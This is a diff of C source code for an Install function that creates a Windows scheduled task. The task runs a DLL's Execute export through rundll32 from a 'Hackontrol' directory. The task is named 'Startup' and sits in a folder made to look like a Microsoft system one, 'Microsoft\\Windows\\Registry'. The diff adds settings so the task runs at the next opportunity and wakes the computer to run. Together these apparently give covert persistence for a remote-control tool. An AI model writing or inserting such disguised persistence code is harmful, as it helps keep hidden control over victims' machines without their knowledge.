@@ -1,10 +1,10 @@
 #include <khopanwin32.h>
 #include <khopanstring.h>
+#include <hackontrol.h>
 #include <taskschd.h>
 
 #define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
-#define FILE_LIBDLL32     L"libdll32.dll"
 #define FUNCTION_LIBDLL32 L"Execute"
 #define TASK_FILE         L"Startup"
 #define TASK_FOLDER       L"Microsoft\\Windows\\Registry"
@@ -149,16 +149,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 		goto releaseTaskDefinition;
 	}
 
-	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
-
-	if(!pathFolderWindows) {
-		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
-		executeAction->lpVtbl->Release(executeAction);
-		goto releaseTaskDefinition;
-	}
-
-	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_RUNDLL32, pathFolderWindows);
-	FREE(pathFolderWindows);
+	LPWSTR pathFileRundll32 = KHWin32GetRundll32FileW();
 
 	if(!pathFileRundll32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
@@ -175,14 +166,42 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_Arguments(executeAction, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32);
-	executeAction->lpVtbl->Release(executeAction);
+	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);
+
+	if(!pathFolderHackontrol) {
+		KHWin32DialogErrorW(GetLastError(), L"HackontrolGetDirectory");
+		executeAction->lpVtbl->Release(executeAction);
+		goto releaseTaskDefinition;
+	}
+
+	LPWSTR argumentFileRundll32 = KHFormatMessageW(L"\"%ws\\" FILE_LIBDLL32 L"\" " FUNCTION_LIBDLL32, pathFolderHackontrol);
+
+	if(!argumentFileRundll32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(pathFolderHackontrol);
+		executeAction->lpVtbl->Release(executeAction);
+		goto releaseTaskDefinition;
+	}
+
+	result = executeAction->lpVtbl->put_Arguments(executeAction, argumentFileRundll32);
+	FREE(argumentFileRundll32);
 
 	if(FAILED(result)) {
 		KHWin32DialogErrorW(result, L"IExecAction::put_Arguments");
+		FREE(pathFolderHackontrol);
+		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
-	
+
+	result = executeAction->lpVtbl->put_WorkingDirectory(executeAction, pathFolderHackontrol);
+	FREE(pathFolderHackontrol);
+	executeAction->lpVtbl->Release(executeAction);
+
+	if(FAILED(result)) {
+		KHWin32DialogErrorW(result, L"IExecAction::put_WorkingDirectory");
+		goto releaseTaskDefinition;
+	}
+
 	ITaskSettings* taskSettings = NULL;
 	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);
 
@@ -195,6 +214,13 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 
 	if(FAILED(result)) {
 		KHWin32DialogErrorW(result, L"ITaskSettings::put_AllowDemandStart");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_StartWhenAvailable(taskSettings, VARIANT_TRUE);
+
+	if(FAILED(result)) {
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_StartWhenAvailable");
 		goto releaseTaskSettings;
 	}
 
@@ -230,6 +256,13 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 
 	if(FAILED(result)) {
 		KHWin32DialogErrorW(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_WakeToRun(taskSettings, VARIANT_TRUE);
+
+	if(FAILED(result)) {
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_WakeToRun");
 		goto releaseTaskSettings;
 	}
 
